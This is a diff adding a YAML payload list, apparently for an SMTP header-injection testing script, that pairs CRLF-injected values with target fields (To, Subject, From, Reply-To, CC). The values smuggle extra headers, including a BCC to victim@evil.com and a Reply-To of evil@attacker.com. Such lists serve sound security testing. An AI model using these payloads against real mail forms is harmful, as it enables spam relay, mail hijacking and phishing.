@@ -1,0 +1,17 @@
+# SMTP Injection Payloads
+# Usado por smtpinjection.py
+# Última atualização: 2026-07-16
+
+injection_payloads:
+  crlf_header: "\r\nX-Injected-Header: test-injection"
+  crlf_bcc: "\r\nBCC: victim@evil.com"
+  crlf_subject: "\r\nSubject: Injected Subject\r\nX-Fake: yes"
+  crlf_body: "\r\n\r\n<html><body>INJECTED</body></html>"
+  crlf_multi: "\r\nReply-To: evil@attacker.com\r\nBCC: all@targets.com"
+
+injection_fields:
+  - To
+  - Subject
+  - From
+  - Reply-To
+  - CC
